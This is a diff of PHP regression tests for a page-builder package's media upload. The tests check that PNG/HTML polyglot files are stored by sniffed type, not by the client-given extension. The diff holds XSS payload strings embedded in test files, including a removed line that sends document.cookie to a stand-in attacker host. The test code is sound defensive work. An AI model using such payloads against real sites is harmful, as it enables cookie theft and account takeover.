@@ -3,29 +3,51 @@
 declare(strict_types=1);
 
 /*
- * GHSA-hj3q-8gc4-6mpw, F4 — /media/upload must not store a file under a
- * client-chosen extension. Owned by the runtime/media fix (MediaLibrary); this
- * test is expected to FAIL until that fix lands.
+ * Regression tests for media storage in 2.0 (GHSA-hj3q-8gc4-6mpw): the stored
+ * extension comes from the file's sniffed content type, never the client name,
+ * so an image/HTML polyglot can't become an .html page on the app's origin.
  */
 
 use Andre\AiPageBuilder\Models\MediaItem;
+use Andre\AiPageBuilder\Services\MediaLibrary;
 use Illuminate\Http\UploadedFile;
 use Illuminate\Support\Facades\Storage;
+use Illuminate\Validation\ValidationException;
 
-it('stores an upload under the extension of its sniffed MIME, not the client name (.html polyglot)', function (): void {
+/** A real PNG with a script appended, uploaded under the given client name. */
+function pngPolyglot(string $clientName): UploadedFile
+{
+    $png = (string) base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=='); // 1x1 PNG, no GD needed
+    $path = tempnam(sys_get_temp_dir(), 'pbpoly');
+    file_put_contents($path, $png.'<script>alert(document.domain)</script>');
+
+    return new UploadedFile($path, $clientName, 'image/png', null, true);
+}
+
+it('stores a PNG/HTML polyglot named x.html as .png through the panel upload', function (string $name): void {
     Storage::fake('public');
 
-    // A real 1x1 PNG with HTML/JS appended: finfo still says image/png.
-    $png = base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR4nGNgYGD4DwABBAEAwS2OUAAAAABJRU5ErkJggg==');
-    // A REAL UploadedFile (not ::fake(), whose MIME comes from the name), so
-    // the `mimetypes:` rule sniffs the CONTENT exactly as in production.
-    $tmp = tempnam(sys_get_temp_dir(), 'pb_polyglot_');
-    file_put_contents($tmp, $png.'<script>fetch("https://attacker.example/?"+document.cookie)</script>');
-    $polyglot = new UploadedFile($tmp, 'invoice.html', null, null, true);
+    $this->actingAs(synapseAdmin())->postJson('/ai-page-builder/media/upload', ['files' => [pngPolyglot($name)]])->assertOk();
 
-    $this->actingAs(synapseAdmin())
-        ->post('/ai-page-builder/media/upload', ['files' => [$polyglot]], ['Accept' => 'application/json'])
-        ->assertOk();
+    $item = MediaItem::query()->firstOrFail();
+    expect($item->filename)->toEndWith('.png');
+    Storage::disk('public')->assertExists($item->directory.'/'.$item->filename);
+})->with(['x.html', 'x.htm', 'x.svg', 'x.shtml', 'noextension']);
 
-    expect((string) MediaItem::query()->latest('id')->value('filename'))->toEndWith('.png');
+it('refuses a file whose sniffed type is not a known media type', function (): void {
+    Storage::fake('public');
+    config()->set('ai-page-builder.media.accept', []);
+    $path = tempnam(sys_get_temp_dir(), 'pbhtml');
+    file_put_contents($path, '<!doctype html><html><body><script>alert(1)</script></body></html>');
+    $html = new UploadedFile($path, 'page.png', 'image/png', null, true); // lies about its type
+
+    expect(fn () => app(MediaLibrary::class)->store($html))->toThrow(ValidationException::class);
+    expect(MediaItem::query()->count())->toBe(0);
+});
+
+it('refuses a known type the host left out of media.accept', function (): void {
+    Storage::fake('public');
+    config()->set('ai-page-builder.media.accept', ['image/jpeg']);
+
+    expect(fn () => app(MediaLibrary::class)->store(pngPolyglot('a.png')))->toThrow(ValidationException::class);
 });
